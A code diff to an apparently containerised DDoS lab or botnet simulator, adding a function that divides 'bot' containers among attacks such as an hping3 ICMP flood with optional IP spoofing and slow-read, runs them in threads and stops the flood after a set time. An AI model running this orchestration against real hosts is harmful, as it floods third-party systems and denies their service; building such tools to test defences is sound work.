@@ -4,7 +4,7 @@ from .settings import client
 from app import db
 
 
-def icmp_flood(container_id, ip_address):
+def icmp_flood(container_id, ip_address=None):
     container = client.containers.get(container_id)
     if ip_address: # If user wants to spoof src IP
         result = container.exec_run(
@@ -40,7 +40,6 @@ def slow_read(container_id, number_of_connections, connection_rate, attack_durat
     )
     print(result.output.decode())
 
-
 def execute_attack(attack, duration, *args): 
     container_ids = [x[0] for x in db.get_bot_ids()]
     threads = [
@@ -66,6 +65,47 @@ def execute_attack(attack, duration, *args):
 
     return "Attack finished"
 
+def execute_attacks(attack_info, attack_duration):
+    container_ids = [x[0] for x in db.get_bot_ids()]
+
+    # Create a dictionary to store the container ids for each attack
+    attack_containers = {}
+
+    # Loop through the attacks and divide the containers based on the number of containers specified in the attack_info dictionary
+    for attack, attack_data in attack_info.items():
+        attack_containers[attack] = container_ids[:attack_data['bots']]
+        container_ids = container_ids[attack_data['bots']:]
+
+    # Create a list of threads for each attack
+    attack_threads = []
+
+    # Loop through the attacks and create a thread for each attack
+    for attack, attack_data in attack_info.items():
+        containers = attack_containers[attack]
+        results = db.get_attack_args(attack)
+        args = []
+        if results is not None:
+            for result in results:
+                args.append(result)
+
+        for container_id in containers:
+            attack_thread = threading.Thread(target=globals().get(attack), args=(container_id, *args))
+            attack_threads.append(attack_thread)
+            attack_thread.start()
+
+        # Wait for the specified duration for icmp_flood attack
+        if attack == 'icmp_flood':
+            time.sleep(attack_duration)
+
+            # Stop icmp flood after duration
+            for container_id in containers:
+                stop_thread = threading.Thread(target=stop_attack, args=(container_id,))
+                stop_thread.start()
+
+    # Wait for all threads to finish
+    for attack_thread in attack_threads:
+        attack_thread.join()
+    return "Attacks finished"
 def stop_attack(container_id):
     container = client.containers.get(container_id)
     result = container.exec_run("pkill hping3")
